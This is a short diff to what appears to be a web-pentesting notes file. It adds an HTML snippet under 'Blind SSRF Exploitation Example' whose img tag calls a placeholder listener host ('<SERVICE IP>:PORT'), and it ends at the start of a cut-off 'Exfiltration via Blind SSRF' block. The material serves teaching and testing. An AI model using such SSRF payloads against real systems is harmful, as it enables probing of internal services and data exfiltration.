@@ -11,6 +11,16 @@ function> }
 ```
 ### Blind SSRF Exploitation Example
 ```
+Code: html
+<!DOCTYPE html>
+<html>
+<body>
+	<a>Hello World!</a>
+	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
+</body>
+</html>
+```
+```
 <html>
     <body>
         <b>Exfiltration via Blind SSRF</b>
